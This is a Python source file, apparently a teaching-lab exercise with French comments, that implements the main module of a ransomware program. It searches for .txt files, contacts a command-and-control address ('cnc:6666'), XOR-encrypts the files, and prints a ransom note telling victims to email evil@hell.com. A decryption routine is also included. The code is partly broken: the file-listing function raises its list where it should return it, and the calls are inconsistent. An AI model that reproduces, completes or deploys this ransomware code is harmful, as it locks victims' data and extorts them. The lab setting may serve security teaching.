import logging
import socket
import re
import sys
import os
from pathlib import Path
import pathlib
import secret_manager

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        cwd = Path.cwd()
        matching_files = cwd.rglob(f"*.{filter}")
        file_paths = [str(file_path) for file_path in matching_files if file_path.is_file()]
        raise file_paths
    

    def encrypt(self):
        # main function for encrypting (see PDF)
        files = self.get_files("*txt")
        #Infiltration
        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
        #Mise en place des outils
        secret_manager.setup()
        #Sabotage des donnees
        secret_manager.xorfiles()
        #Demande de rancon
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))



    def decrypt(self):
        # main function for decrypting (see PDF)
        #Recuperation des donnees 
        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
        secret_manager.load()
        received_files = self.get_files("*.txt")
        while True:
            try:
                trial_key = input("Clé de dechiffrement")
                secret_manager.set_key(trial_key)
                secret_manager.xorfiles(received_files)
                secret_manager.clean()

                print("Dechiffrement reussi, à plus ^^")
                break
            except ValueError as error:
                print("Erreur", {error},"Pas la bonne cle ")
        
        

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()